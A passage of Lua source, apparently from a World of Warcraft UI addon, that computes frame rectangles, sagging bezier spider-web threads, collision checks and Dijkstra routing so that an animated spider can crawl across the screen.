    if w < C.MIN_ANCHOR_SIZE or h < C.MIN_ANCHOR_SIZE then
        return nil
    end

    if ur < baseX or ul > baseX + scrW or ut < baseY or ub > baseY + scrH then
        return nil
    end

    return {
        name = self:DisplayName(f),
        left = (ul - baseX) / uiScale,
        right = (ur - baseX) / uiScale,
        bottom = (ub - baseY) / uiScale,
        top = (ut - baseY) / uiScale,
        width = w / uiScale,
        height = h / uiScale,
    }
end

function NSPauk:MakeInnerRect(r)
    local C = self.C
    local w = r.right - r.left
    local h = r.top - r.bottom

    if w < C.MIN_ANCHOR_SIZE or h < C.MIN_ANCHOR_SIZE then
        return nil
    end

    local ix = w * 0.10
    local iy = h * 0.10

    local left = r.left + ix
    local right = r.right - ix
    local bottom = r.bottom + iy
    local top = r.top - iy

    local iw = right - left
    local ih = top - bottom

    if iw < C.MIN_INNER_SIZE or ih < C.MIN_INNER_SIZE then
        return nil
    end

    return {
        name = r.name,
        left = left,
        right = right,
        bottom = bottom,
        top = top,
        width = iw,
        height = ih,
        cx = (left + right) / 2,
        cy = (bottom + top) / 2,
    }
end

function NSPauk:ComputeFrameVisibleInner(frame)
    local rect = self:ComputeFrameVisibleRect(frame)

    if not rect then
        return nil
    end

    return self:MakeInnerRect(rect)
end

function NSPauk:FrameMoved(storedRect, frame)
    if not frame then
        return false
    end

    if not storedRect then
        return true
    end

    local cur = self:ComputeFrameVisibleInner(frame)

    if not cur then
        return true
    end

    local tol = self.C.MOVEMENT_TOLERANCE

    return math.abs(cur.left - storedRect.left) > tol
        or math.abs(cur.right - storedRect.right) > tol
        or math.abs(cur.bottom - storedRect.bottom) > tol
        or math.abs(cur.top - storedRect.top) > tol
end

function NSPauk:CollectVisibleItems()
    local C = self.C
    local items = {}

    local uiScale = self:EffScale(UIParent)
    local baseX = (UIParent.GetLeft and UIParent:GetLeft() or 0) * uiScale
    local baseY = (UIParent.GetBottom and UIParent:GetBottom() or 0) * uiScale
    local scrW = ((GetScreenWidth and GetScreenWidth()) or UIParent:GetWidth() or 1) * uiScale
    local scrH = ((GetScreenHeight and GetScreenHeight()) or UIParent:GetHeight() or 1) * uiScale

    local f = EnumerateFrames()

    while f do
        local rect = self:ComputeFrameVisibleRect(f, uiScale, baseX, baseY, scrW, scrH)

        if rect then
            local inner = self:MakeInnerRect(rect)

            if inner then
                inner.frame = f
                inner.name = rect.name
                items[#items + 1] = inner
            end
        end

        if #items >= C.MAX_VISIBLE_RECTS then
            break
        end

        f = EnumerateFrames(f)
    end

    return items
end

function NSPauk:IsGoodAnchorName(name)
    if type(name) ~= "string" or name == "" then
        return false
    end

    if name:sub(1, 1) == "(" then
        return false
    end

    if name == "WorldFrame" or name == "UIParent" or name == "MinimapCluster" then
        return false
    end

    return true
end

function NSPauk:MakeSag(thread, mode, hubX, hubY)
    if not thread or not thread.p0 or not thread.p2 then
        return
    end

    local C = self.C
    local D = self.DefaultConstants

    local p0 = thread.p0
    local p2 = thread.p2

    local dx = p2.x - p0.x
    local dy = p2.y - p0.y
    local len = math.sqrt(dx * dx + dy * dy)

    local mx = (p0.x + p2.x) / 2
    local my = (p0.y + p2.y) / 2

    if len < 1 then
        thread.p1 = {
            x = mx,
            y = my - 0.5,
        }

        return
    end

    local minSag
    local maxSag
    local jitter

    if mode == "main" then
        minSag = C.MAIN_SAG_MIN or D.MAIN_SAG_MIN
        maxSag = C.MAIN_SAG_MAX or D.MAIN_SAG_MAX
        jitter = 0.06
    elseif mode == "cross" then
        minSag = C.CROSS_SAG_MIN or D.CROSS_SAG_MIN
        maxSag = C.CROSS_SAG_MAX or D.CROSS_SAG_MAX
        jitter = 0.08
    else
        minSag = C.INTERCROSS_SAG_MIN or D.INTERCROSS_SAG_MIN
        maxSag = C.INTERCROSS_SAG_MAX or D.INTERCROSS_SAG_MAX
        jitter = 0.08
    end

    local ratio = self:RandomFloat(minSag, maxSag)

    if type(ratio) ~= "number" or ratio ~= ratio or ratio <= 0 then
        ratio = 0.10
    end

    local sag = len * ratio

    if type(sag) ~= "number" or sag ~= sag or sag <= 0 then
        sag = math.max(len * 0.10, 0.5)
    elseif sag < 0.5 then
        sag = 0.5
    end

    local offsetX = (math.random() - 0.5) * len * jitter

    thread.p1 = {
        x = mx + offsetX,
        y = my - sag,
    }

    if thread.p1.y >= my then
        thread.p1.y = my - sag
    end
end

function NSPauk:BuildArcSamples(thread)
    local C = self.C

    local samples = {}
    local total = 0

    local prevX, prevY = self:BzThread(thread, 0)

    samples[1] = { len = 0, t = 0 }

    local n = C.ARC_SAMPLES

    if n < 16 then
        n = 16
    end

    for i = 1, n do
        local t = i / n
        local x, y = self:BzThread(thread, t)

        local dx = x - prevX
        local dy = y - prevY

        total = total + math.sqrt(dx * dx + dy * dy)

        samples[i + 1] = { len = total, t = t }

        prevX, prevY = x, y
    end

    return samples, total
end

function NSPauk:ThreadTAtLength(conn, targetLen)
    local samples = conn.arcSamples
    local total = conn.arcLength

    if not samples or not total or total <= 0 then
        return nil
    end

    if targetLen <= 0 then
        return 0
    end

    if targetLen > total + 0.001 then
        return nil
    end

    if targetLen >= total - 0.001 then
        return 1
    end

    local lo = 1
    local hi = #samples

    while lo + 1 < hi do
        local mid = math.floor((lo + hi) / 2)

        if samples[mid].len < targetLen then
            lo = mid
        else
            hi = mid
        end
    end

    local a = samples[lo]
    local b = samples[hi]

    local span = b.len - a.len

    if span <= 0.0001 then
        return a.t
    end

    local f = (targetLen - a.len) / span

    return a.t + (b.t - a.t) * f
end

function NSPauk:MakeRadialThread(hubRect, targetRect, lineIndex, lineCount)
    local C = self.C

    lineIndex = lineIndex or 1
    lineCount = lineCount or 1

    for _ = 1, 10 do
        local tx, ty, hx, hy

        if lineCount > 1 then
            local f = (lineIndex - 1) / (lineCount - 1) - 0.5

            tx = targetRect.cx
                + f * targetRect.width * 0.65
                + (math.random() - 0.5) * targetRect.width * 0.15

            ty = targetRect.cy
                + (math.random() - 0.5) * targetRect.height * 0.65
        else
            tx = targetRect.cx
                + (math.random() - 0.5) * targetRect.width * 0.50

            ty = targetRect.cy
                + (math.random() - 0.5) * targetRect.height * 0.50
        end

        hx = hubRect.cx + (math.random() - 0.5) * hubRect.width * 0.45
        hy = hubRect.cy + (math.random() - 0.5) * hubRect.height * 0.45

        local sx, sy = self:EdgePoint(hubRect, tx, ty)
        local ex, ey = self:EdgePoint(targetRect, hx, hy)

        local dx = ex - sx
        local dy = ey - sy
        local len = math.sqrt(dx * dx + dy * dy)

        if len >= C.MIN_WEB_GAP then
            local thread = {
                p0 = { x = sx, y = sy },
                p2 = { x = ex, y = ey },
            }

            self:MakeSag(thread, "main")

            local ax = sx - hubRect.cx
            local ay = sy - hubRect.cy

            if ax == 0 and ay == 0 then
                ax = targetRect.cx - hubRect.cx
                ay = targetRect.cy - hubRect.cy
            end

            local angle = math.atan2(ay, ax)

            if angle < 0 then
                angle = angle + (2 * math.pi)
            end

            thread.angle = angle

            return thread
        end
    end

    local sx, sy = self:EdgePoint(hubRect, targetRect.cx, targetRect.cy)
    local ex, ey = self:EdgePoint(targetRect, hubRect.cx, hubRect.cy)

    local dx = ex - sx
    local dy = ey - sy
    local len = math.sqrt(dx * dx + dy * dy)

    if len < C.MIN_WEB_GAP then
        return nil
    end

    local thread = {
        p0 = { x = sx, y = sy },
        p2 = { x = ex, y = ey },
    }

    self:MakeSag(thread, "main")

    local angle = math.atan2(targetRect.cy - hubRect.cy, targetRect.cx - hubRect.cx)

    if angle < 0 then
        angle = angle + (2 * math.pi)
    end

    thread.angle = angle

    return thread
end

function NSPauk:CopyRect(r)
    return {
        name = r.name,
        frame = r.frame,
        left = r.left,
        right = r.right,
        bottom = r.bottom,
        top = r.top,
        width = r.width,
        height = r.height,
        cx = r.cx,
        cy = r.cy,
    }
end

function NSPauk:NormalizeFallbackRect(r)
    r.width = r.right - r.left
    r.height = r.top - r.bottom
    r.cx = (r.left + r.right) / 2
    r.cy = (r.bottom + r.top) / 2
    r.frame = nil

    return r
end

function NSPauk:PickCentralHub(items)
    local S = self.S

    local cx = S.SW / 2
    local cy = S.SH / 2

    local best = nil
    local bestD = math.huge

    for _, item in ipairs(items) do
        local dx = item.cx - cx
        local dy = item.cy - cy
        local d = dx * dx + dy * dy

        if d < bestD then
            bestD = d
            best = item
        end
    end

    return best
end

function NSPauk:FallbackHubAndTargets()
    local S = self.S

    local SW, SH = self:GetScreenSize()
    S.SW, S.SH = SW, SH

    local hub = self:NormalizeFallbackRect({
        name = "FallbackHub",
        left = SW * 0.44,
        right = SW * 0.56,
        bottom = SH * 0.44,
        top = SH * 0.56,
    })

    local defs = {
        { 0.08, 0.26, 0.68, 0.86 },
        { 0.74, 0.92, 0.68, 0.86 },
        { 0.74, 0.92, 0.14, 0.32 },
        { 0.08, 0.26, 0.14, 0.32 },
    }

    local candidates = {}

    for i, d in ipairs(defs) do
        local target = self:NormalizeFallbackRect({
            name = "FallbackTarget" .. i,
            left = SW * d[1],
            right = SW * d[2],
            bottom = SH * d[3],
            top = SH * d[4],
        })

        candidates[#candidates + 1] = { item = target }
    end

    return hub, candidates, 4
end

function NSPauk:PickWebHub(items)
    if not items or #items == 0 then
        return nil
    end

    local good = {}

    for _, item in ipairs(items) do
        if self:IsGoodAnchorName(item.name) then
            good[#good + 1] = item
        end
    end

    local pool = good

    if #pool == 0 then
        pool = items
    end

    if math.random(1, 2) == 1 then
        local hub = self:PickCentralHub(pool)

        if hub then
            return hub
        end
    end

    return pool[math.random(1, #pool)]
end

function NSPauk:PickHub(preferred, items)
    return self:PickWebHub(items)
end

function NSPauk:ChooseNextHub(inst)
    if not inst or not inst.anchorCandidates or #inst.anchorCandidates == 0 then
        return nil
    end

    local good = {}

    for _, r in ipairs(inst.anchorCandidates) do
        if self:IsGoodAnchorName(r.name) then
            good[#good + 1] = r
        end
    end

    local source = good

    if #source == 0 then
        source = inst.anchorCandidates
    end

    local list = {}

    for i, r in ipairs(source) do
        list[i] = r
    end

    self:Shuffle(list)

    for _, r in ipairs(list) do
        if r.frame then
            local cur = self:ComputeFrameVisibleInner(r.frame)

            if cur then
                return cur
            end
        elseif r.left and r.right and r.bottom and r.top then
            return self:NormalizeFallbackRect(self:CopyRect(r))
        end
    end

    return nil
end

function NSPauk:CollectTargetCandidates(hub, items)
    local good = {}
    local all = {}

    for _, item in ipairs(items) do
        if item ~= hub and item.frame ~= hub.frame then
            all[#all + 1] = { item = item }

            if self:IsGoodAnchorName(item.name) then
                good[#good + 1] = { item = item }
            end
        end
    end

    local pool = good

    if #pool == 0 then
        pool = all
    end

    return self:Shuffle(pool)
end

function NSPauk:ValidateAnchorRect(rect)
    if not rect then
        return false
    end

    if not rect.frame then
        return true
    end

    local cur = self:ComputeFrameVisibleInner(rect.frame)

    if not cur then
        return false
    end

    local tol = self.C.MOVEMENT_TOLERANCE

    return math.abs(cur.left - rect.left) <= tol
        and math.abs(cur.right - rect.right) <= tol
        and math.abs(cur.bottom - rect.bottom) <= tol
        and math.abs(cur.top - rect.top) <= tol
end

function NSPauk:ValidateConnection(inst, conn)
    if not inst or not conn or not conn.alive then
        return false
    end

    if not self:ValidateAnchorRect(inst.hub.rect) then
        self:KillConnection(inst, conn)
        return false
    end

    if not self:ValidateAnchorRect(conn.target.rect) then
        self:KillConnection(inst, conn)
        return false
    end

    return true
end

function NSPauk:InstanceHasAliveConn(inst)
    if not inst then
        return false
    end

    for _, conn in ipairs(inst.conns) do
        if conn.alive then
            return true
        end
    end

    return false
end

function NSPauk:SettleInstance(inst)
    local S = self.S

    if not inst or inst.settled then
        return
    end

    if S.suppressSettle then
        return
    end

    inst.settled = true

    local count = inst.drawnPoints or 0

    if count <= 0 then
        return
    end

    self:SettleWebPoints(count)
end

function NSPauk:CheckInstanceDead(inst)
    if not inst then
        return
    end

    if not self:InstanceHasAliveConn(inst) then
        if not inst.settled then
            self:SettleInstance(inst)
        end

        inst.torn = true
    end
end

function NSPauk:RemoveTornInstances()
    local S = self.S

    for i = #S.instances, 1, -1 do
        local inst = S.instances[i]

        if inst and inst.torn then
            table.remove(S.instances, i)

            if S.currentInstance == inst then
                S.currentInstance = nil
            end
        end
    end
end

function NSPauk:GetOwnerInstance(owner)
    if not owner then
        return nil
    end

    if owner.thread and owner.thread.ownerRef and owner.thread.ownerRef.inst then
        return owner.thread.ownerRef.inst
    end

    if owner.connA
        and owner.connA.thread
        and owner.connA.thread.ownerRef
        and owner.connA.thread.ownerRef.inst then
        return owner.connA.thread.ownerRef.inst
    end

    if owner.connB
        and owner.connB.thread
        and owner.connB.thread.ownerRef
        and owner.connB.thread.ownerRef.inst then
        return owner.connB.thread.ownerRef.inst
    end

    if owner.parentSegA
        and owner.parentSegA.thread
        and owner.parentSegA.thread.ownerRef
        and owner.parentSegA.thread.ownerRef.inst then
        return owner.parentSegA.thread.ownerRef.inst
    end

    if owner.parentSegB
        and owner.parentSegB.thread
        and owner.parentSegB.thread.ownerRef
        and owner.parentSegB.thread.ownerRef.inst then
        return owner.parentSegB.thread.ownerRef.inst
    end

    return nil
end

function NSPauk:SampleThreadPoints(thread, ignoreHubDist)
    local points = {}

    if not thread then
        return points
    end

    local samples, total = self:BuildArcSamples(thread)

    if not total or total <= 0 then
        return points
    end

    if type(ignoreHubDist) ~= "number" or ignoreHubDist ~= ignoreHubDist or ignoreHubDist < 0 then
        ignoreHubDist = 0
    end

    if total <= ignoreHubDist then
        return points
    end

    local temp = {
        arcSamples = samples,
        arcLength = total,
    }

    local step = 6
    local len = ignoreHubDist

    while len <= total do
        local t = self:ThreadTAtLength(temp, len)

        if t then
            local x, y = self:BzThread(thread, t)
            points[#points + 1] = { x = x, y = y }
        end

        len = len + step
    end

    local x, y = self:BzThread(thread, 1)
    local last = points[#points]

    if not last or math.abs(last.x - x) > 0.5 or math.abs(last.y - y) > 0.5 then
        points[#points + 1] = { x = x, y = y }
    end

    return points
end

function NSPauk:GetThreadCollisionPoints(thread, ignoreHubDist)
    if not thread then
        return {}
    end

    if thread._nspColPts and thread._nspColIgnore == ignoreHubDist then
        return thread._nspColPts
    end

    local pts = self:SampleThreadPoints(thread, ignoreHubDist)

    thread._nspColPts = pts
    thread._nspColIgnore = ignoreHubDist

    return pts
end

function NSPauk:ThreadsTooClose(threadA, threadB, minDist, ignoreHubDist)
    if not threadA or not threadB then
        return false
    end

    if type(minDist) ~= "number" or minDist ~= minDist or minDist <= 0 then
        return false
    end

    local ptsA = self:GetThreadCollisionPoints(threadA, ignoreHubDist)
    local ptsB = self:GetThreadCollisionPoints(threadB, ignoreHubDist)

    if #ptsA == 0 or #ptsB == 0 then
        return false
    end

    local min2 = minDist * minDist

    for _, a in ipairs(ptsA) do
        for _, b in ipairs(ptsB) do
            local dx = a.x - b.x
            local dy = a.y - b.y

            if (dx * dx + dy * dy) < min2 then
                return true
            end
        end
    end

    return false
end

function NSPauk:ComputeCrossSectors(inst)
    local allowed = {}
    local angleDeg = {}

    if not inst then
        return allowed, angleDeg
    end

    local N = #inst.conns

    if N < 2 then
        return allowed, angleDeg
    end

    local maxDeg = tonumber(self.C.CROSS_MAX_SECTOR_ANGLE)

    if type(maxDeg) ~= "number" or maxDeg ~= maxDeg or maxDeg <= 0 then
        maxDeg = 160
    end

    local twoPi = math.pi * 2
    local maxRad = maxDeg * math.pi / 180

    for i = 1, N do
        local connA = inst.conns[i]
        local connB = inst.conns[(i % N) + 1]

        local a = connA.thread and connA.thread.angle or 0
        local b = connB.thread and connB.thread.angle or 0

        local delta = b - a

        while delta < 0 do
            delta = delta + twoPi
        end

        while delta >= twoPi do
            delta = delta - twoPi
        end

        local effective = delta

        if N == 2 then
            effective = math.min(delta, twoPi - delta)
        end

        angleDeg[i] = effective * 180 / math.pi
        allowed[i] = effective <= maxRad
    end

    return allowed, angleDeg
end

function NSPauk:CreateCrossSegArc(inst, connA, connB, tA, tB, minLen)
    local C = self.C

    local ax, ay = self:BzThread(connA.thread, tA)
    local bx, by = self:BzThread(connB.thread, tB)

    local dx = bx - ax
    local dy = by - ay

    if not minLen or minLen < 0 then
        minLen = C.MIN_CROSS_LEN
    end

    if (dx * dx + dy * dy) < (minLen * minLen) then
        return nil
    end

    local thread = {
        p0 = { x = ax, y = ay },
        p2 = { x = bx, y = by },
    }

    local hubX = (inst.hub.rect and inst.hub.rect.cx) or 0
    local hubY = (inst.hub.rect and inst.hub.rect.cy) or 0

    self:MakeSag(thread, "cross", hubX, hubY)

    local seg = {
        connA = connA,
        connB = connB,
        thread = thread,
        textures = {},
        alive = true,
        t = (tA + tB) / 2,
    }

    thread.ownerRef = {
        inst = inst,
        seg = seg,
    }

    inst.crossSegs[#inst.crossSegs + 1] = seg

    return seg
end

---------------------------------------------------------------------------
-- Map/crawl: вспомогательные методы маршрутизации
---------------------------------------------------------------------------

function NSPauk:NP_GetGap()
    local C = self.C or {}
    local size = tonumber(C.SPIDER_SIZE) or 64
    local gap = size * 0.5

    if gap < 8 then
        gap = 8
    end

    return gap
end

function NSPauk:NP_EnsureThreadSamples(thread)
    if not thread then
        return nil
    end

    local count = getThreadTexCount(thread)

    if thread._nspMapSamples and thread._nspMapTexCount ~= count then
        thread._nspMapSamples = nil
        thread._nspMapTexCount = nil
        thread._nspColPts = nil
        thread._nspColIgnore = nil
    end

    if not thread._nspMapSamples then
        local pts = {}
        local n = 16

        for i = 0, n - 1 do
            local t = i / (n - 1)
            local x, y = self:BzThread(thread, t)
            pts[#pts + 1] = { x = x, y = y }
        end

        thread._nspMapSamples = pts
    end

    thread._nspMapTexCount = count
    return thread._nspMapSamples
end

function NSPauk:NP_EnsureFrameCache()
    local S = self.S
    local now = GetTime()

    if S.nspFrameCache and now - (S.nspFrameCache.t or 0) < 0.35 then
        return S.nspFrameCache.rects
    end

    local items = self:CollectVisibleItems()
    local rects = {}

    for _, item in ipairs(items) do
        if item and item.frame and item.left and item.right and item.bottom and item.top then
            rects[#rects + 1] = {
                name = item.name,
                frame = item.frame,
                left = item.left,
                right = item.right,
                bottom = item.bottom,
                top = item.top,
                width = item.width or (item.right - item.left),
                height = item.height or (item.top - item.bottom),
                cx = item.cx or ((item.left + item.right) / 2),
                cy = item.cy or ((item.bottom + item.top) / 2),
            }
        end
    end

    S.nspFrameCache = {
        t = now,
        rects = rects,
    }

    return rects
end

function NSPauk:NP_GetVisibleFrameRects(a, b, padOverride)
    local all = self:NP_EnsureFrameCache()
    local pad = padOverride or 280

    local minX = math.min(a.x, b.x) - pad
    local maxX = math.max(a.x, b.x) + pad
    local minY = math.min(a.y, b.y) - pad
    local maxY = math.max(a.y, b.y) + pad

    local cx = (minX + maxX) / 2
    local cy = (minY + maxY) / 2

    local cand = {}

    for _, r in ipairs(all) do
        if r.right >= minX and r.left <= maxX and r.top >= minY and r.bottom <= maxY then
            local dx = r.cx - cx
            local dy = r.cy - cy
            cand[#cand + 1] = { r = r, d = dx * dx + dy * dy }
        end
    end

    table.sort(cand, function(x, y)
        return x.d < y.d
    end)

    local out = {}
    local limit = 50

    for i = 1, #cand do
        if i > limit then
            break
        end

        out[#out + 1] = cand[i].r
    end

    return out
end

function NSPauk:NP_GetWebThreads(a, b, padOverride)
    local S = self.S
    local pad = padOverride or 260

    local minX = math.min(a.x, b.x) - pad
    local maxX = math.max(a.x, b.x) + pad
    local minY = math.min(a.y, b.y) - pad
    local maxY = math.max(a.y, b.y) + pad

    local cx = (minX + maxX) / 2
    local cy = (minY + maxY) / 2

    local cand = {}

    local function consider(thread, owner)
        if not thread or not thread.p0 or not thread.p2 then
            return
        end

        if not owner or not owner.textures or #owner.textures == 0 then
            return
        end

        local minx = math.min(thread.p0.x, thread.p2.x)
        local maxx = math.max(thread.p0.x, thread.p2.x)
        local miny = math.min(thread.p0.y, thread.p2.y)
        local maxy = math.max(thread.p0.y, thread.p2.y)

        if thread.p1 then
            if thread.p1.x < minx then
                minx = thread.p1.x
            end

            if thread.p1.x > maxx then
                maxx = thread.p1.x
            end

            if thread.p1.y < miny then
                miny = thread.p1.y
            end

            if thread.p1.y > maxy then
                maxy = thread.p1.y
            end
        end

        if maxx < minX or minx > maxX or maxy < minY or miny > maxY then
            return
        end

        local mx = (minx + maxx) / 2
        local my = (miny + maxy) / 2
        local dx = mx - cx
        local dy = my - cy

        cand[#cand + 1] = { thread = thread, d = dx * dx + dy * dy }
    end

    for _, inst in ipairs(S.instances) do
        if inst.conns then
            for _, conn in ipairs(inst.conns) do
                if conn.alive and conn.thread then
                    consider(conn.thread, conn)
                end
            end
        end

        if inst.crossSegs then
            for _, seg in ipairs(inst.crossSegs) do
                if seg.alive and seg.thread then
                    consider(seg.thread, seg)
                end
            end
        end
    end

    table.sort(cand, function(x, y)
        return x.d < y.d
    end)

    local out = {}
    local limit = 35

    for i = 1, #cand do
        if i > limit then
            break
        end

        local thread = cand[i].thread
        local samples = self:NP_EnsureThreadSamples(thread)

        if samples then
            out[#out + 1] = { thread = thread, samples = samples }
        end
    end

    return out
end

function NSPauk:NP_FindSupportAt(x, y)
    local S = self.S
    local gap = self:NP_GetGap()
    local sw, sh = self:GetScreenSize()
    local rects = self:NP_EnsureFrameCache()

    for _, r in ipairs(rects) do
        if x >= r.left - 1 and x <= r.right + 1 and y >= r.bottom - 1 and y <= r.top + 1 then
            return { kind = "frame", name = r.name, x = x, y = y, rect = r }
        end
    end

    local checked = 0

    local function checkThread(thread, owner)
        if not thread or not thread.p0 or not thread.p2 then
            return false
        end

        if not owner or not owner.textures or #owner.textures == 0 then
            return false
        end

        if self:ThreadNearMouse(thread, x, y, gap) then
            local d = self:DistToThread(thread, x, y)

            if d <= gap * 0.75 then
                return true
            end
        end

        return false
    end

    for _, inst in ipairs(S.instances) do
        if inst.conns then
            for _, conn in ipairs(inst.conns) do
                if conn.alive and conn.thread then
                    checked = checked + 1

                    if checkThread(conn.thread, conn) then
                        return { kind = "web", name = "паутина", x = x, y = y }
                    end
                end
            end
        end

        if inst.crossSegs then
            for _, seg in ipairs(inst.crossSegs) do
                if seg.alive and seg.thread then
                    checked = checked + 1

                    if checkThread(seg.thread, seg) then
                        return { kind = "web", name = "паутина", x = x, y = y }
                    end
                end
            end
        end

        if checked >= 80 then
            break
        end
    end

    if x <= gap then
        return { kind = "edge", name = "край экрана", side = "left", x = 0, y = y }
    elseif x >= sw - gap then
        return { kind = "edge", name = "край экрана", side = "right", x = sw, y = y }
    elseif y <= gap then
        return { kind = "edge", name = "край экрана", side = "bottom", x = x, y = 0 }
    elseif y >= sh - gap then
        return { kind = "edge", name = "край экрана", side = "top", x = x, y = sh }
    end

    return nil
end

function NSPauk:NP_HasSupportAt(x, y)
    local S = self.S
    local now = GetTime()

    local rx = math.floor((x or 0) / 2 + 0.5)
    local ry = math.floor((y or 0) / 2 + 0.5)

    local c = S.nspSupportCache

    if c and now - (c.t or 0) < 0.12 and c.x == rx and c.y == ry then
        return c.ok
    end

    local sup = self:NP_FindSupportAt(x, y)
    local ok = sup ~= nil

    S.nspSupportCache = { t = now, x = rx, y = ry, ok = ok, sup = sup }

    return ok
end

function NSPauk:NP_FindFallTarget(x, y)
    local gap = self:NP_GetGap()
    local bestY = -math.huge
    local best = { x = x, y = 0, kind = "edge", name = "край экрана" }

    local rects = self:NP_EnsureFrameCache()

    for _, r in ipairs(rects) do
        if r.frame then
            local cur = self:ComputeFrameVisibleInner(r.frame)

            if cur and x >= cur.left - 2 and x <= cur.right + 2 then
                local top = cur.top

                if top <= y + 1 and top > bestY then
                    bestY = top
                    best = {
                        x = x,
                        y = top,
                        kind = "frame",
                        name = cur.name or r.name,
                        rect = cur,
                    }
                end
            end
        end
    end

    local checked = 0

    local function consider(thread, owner)
        if not thread or not thread.p0 or not thread.p2 then
            return
        end

        if not owner or not owner.textures or #owner.textures == 0 then
            return
        end

        local samples = self:NP_EnsureThreadSamples(thread)
        if not samples then
            return
        end

        for _, p in ipairs(samples) do
            if math.abs(p.x - x) <= gap and p.y <= y + 1 and p.y > bestY then
                bestY = p.y
                best = {
                    x = x,
                    y = p.y,
                    kind = "web",
                    name = "паутина",
                }
            end
        end
    end

    for _, inst in ipairs(self.S.instances) do
        if inst.conns then
            for _, conn in ipairs(inst.conns) do
                if conn.alive and conn.thread then
                    checked = checked + 1
                    consider(conn.thread, conn)
                end
            end
        end

        if inst.crossSegs then
            for _, seg in ipairs(inst.crossSegs) do
                if seg.alive and seg.thread then
                    checked = checked + 1
                    consider(seg.thread, seg)
                end
            end
        end

        if checked >= 80 then
            break
        end
    end

    if best.y < 0 then
        best.y = 0
    end

    return best
end

function NSPauk:NP_SupportDescription(sup)
    if not sup then
        return "нет"
    end

    if sup.kind == "frame" then
        return string.format("фрейм %s (%.0f,%.0f)", tostring(sup.name or "?"), sup.x or 0, sup.y or 0)
    elseif sup.kind == "web" then
        return string.format("паутина (%.0f,%.0f)", sup.x or 0, sup.y or 0)
    elseif sup.kind == "edge" then
        return string.format("край экрана %s (%.0f,%.0f)", tostring(sup.side or "?"), sup.x or 0, sup.y or 0)
    end

    return string.format("объект (%.0f,%.0f)", sup.x or 0, sup.y or 0)
end

function NSPauk:NP_Dijkstra(start, nodes, edges)
    local n = #nodes
    local distArr = {}
    local prev = {}
    local done = {}

    for i = 1, n do
        distArr[i] = math.huge
    end

    distArr[start] = 0

    for _ = 1, n do
        local u = nil
        local best = math.huge

        for i = 1, n do
            if not done[i] and distArr[i] < best then
                best = distArr[i]
                u = i
            end
        end

        if not u then
            break
        end

        done[u] = true

        if edges[u] then
            for _, e in ipairs(edges[u]) do
                local v = e.to

                if v and distArr[u] + e.w < distArr[v] then
                    distArr[v] = distArr[u] + e.w
                    prev[v] = u
                end
            end
        end
    end

    return distArr, prev
end

function NSPauk:NP_ReconstructPath(prev, start, goal, nodes)
    local rev = {}
    local cur = goal
    local reached = false
    local guard = 0

    while cur do
        guard = guard + 1

        if guard > 10000 then
            break
        end

        rev[#rev + 1] = cur

        if cur == start then
            reached = true
            break
        end

        cur = prev[cur]
    end

    if not reached then
        return nil
    end

    local pts = {}

    for i = #rev, 1, -1 do
        local n = nodes[rev[i]]

        if n then
            pts[#pts + 1] = { x = n.x or 0, y = n.y or 0, kind = n.kind }
        end
    end

    return pts
end

function NSPauk:NP_BuildRoute(from, to)
    local S = self.S
    local sw, sh = self:GetScreenSize()
    S.SW, S.SH = sw, sh

    local gap = self:NP_GetGap()
    local frames = self:NP_GetVisibleFrameRects(from, to, 280)
    local threads = self:NP_GetWebThreads(from, to, 260)

    local nodes = {}
    local edges = {}

    local function addNode(n)
        table.insert(nodes, n)
        edges[#nodes] = {}
        return #nodes
    end

    local EDGE_PENALTY = 1.45
    local WEB_BONUS = 0.82
    local FRAME_BONUS = 0.98
    local GAP_PENALTY = 1.05

    local function addEdge(a, b, w, kind)
        if a and b and a ~= b then
            if not w or w < 0 then
                w = 0
            end

            if kind == "edge" then
                w = w * EDGE_PENALTY
            elseif kind == "web" then
                w = w * WEB_BONUS
            elseif kind == "frame" then
                w = w * FRAME_BONUS
            elseif kind == "gap" then
                w = w * GAP_PENALTY
            end

            table.insert(edges[a], { to = b, w = w })
            table.insert(edges[b], { to = a, w = w })
        end
    end

    local function addEdgeNode(x, y, side)
        addNode({ x = x, y = y, kind = "edge", edgeSide = side })
    end

    addEdgeNode(0, 0, "bottom")
    addEdgeNode(sw * 0.5, 0, "bottom")
    addEdgeNode(sw, 0, "bottom")

    addEdgeNode(sw, 0, "right")
    addEdgeNode(sw, sh * 0.5, "right")
    addEdgeNode(sw, sh, "right")

    addEdgeNode(sw, sh, "top")
    addEdgeNode(sw * 0.5, sh, "top")
    addEdgeNode(0, sh, "top")

    addEdgeNode(0, sh, "left")
    addEdgeNode(0, sh * 0.5, "left")
    addEdgeNode(0, 0, "left")

    local function addEdgeProjection(id)
        local n = nodes[id]
        if not n or n.kind == "edge" then
            return
        end

        if n.x <= gap then
            local eid = addNode({ x = 0, y = n.y, kind = "edge", edgeSide = "left" })
            addEdge(id, eid, math.abs(n.x), "edge")
        end

        if n.x >= sw - gap then
            local eid = addNode({ x = sw, y = n.y, kind = "edge", edgeSide = "right" })
            addEdge(id, eid, math.abs(sw - n.x), "edge")
        end

        if n.y <= gap then
            local eid = addNode({ x = n.x, y = 0, kind = "edge", edgeSide = "bottom" })
            addEdge(id, eid, math.abs(n.y), "edge")
        end

        if n.y >= sh - gap then
            local eid = addNode({ x = n.x, y = sh, kind = "edge", edgeSide = "top" })
            addEdge(id, eid, math.abs(sh - n.y), "edge")
        end
    end

    for fi, rect in ipairs(frames) do
        local cx = (rect.left + rect.right) / 2
        local cy = (rect.bottom + rect.top) / 2

        local pts = {
            { x = rect.left, y = rect.bottom },
            { x = cx, y = rect.bottom },
            { x = rect.right, y = rect.bottom },
            { x = rect.right, y = cy },
            { x = rect.right, y = rect.top },
            { x = cx, y = rect.top },
            { x = rect.left, y = rect.top },
            { x = rect.left, y = cy },
        }

        local ids = {}

        for _, p in ipairs(pts) do
            local id = addNode({
                x = p.x,
                y = p.y,
                kind = "frame",
                frameId = fi,
                name = rect.name,
                frame = rect.frame,
            })

            ids[#ids + 1] = id
        end

        frames[fi].nodeIds = ids

        for a = 1, #ids do
            for b = a + 1, #ids do
                local na = nodes[ids[a]]
                local nb = nodes[ids[b]]
                local dx = na.x - nb.x
                local dy = na.y - nb.y

                addEdge(ids[a], ids[b], math.sqrt(dx * dx + dy * dy), "frame")
            end

            addEdgeProjection(ids[a])
        end
    end

    for wi, info in ipairs(threads) do
        local ids = {}
        local prevId = nil

        for _, p in ipairs(info.samples) do
            local id = addNode({
                x = p.x,
                y = p.y,
                kind = "web",
                webId = wi,
                thread = info.thread,
            })

            ids[#ids + 1] = id

            if prevId then
                local pp = nodes[prevId]
                local dx = pp.x - p.x
                local dy = pp.y - p.y

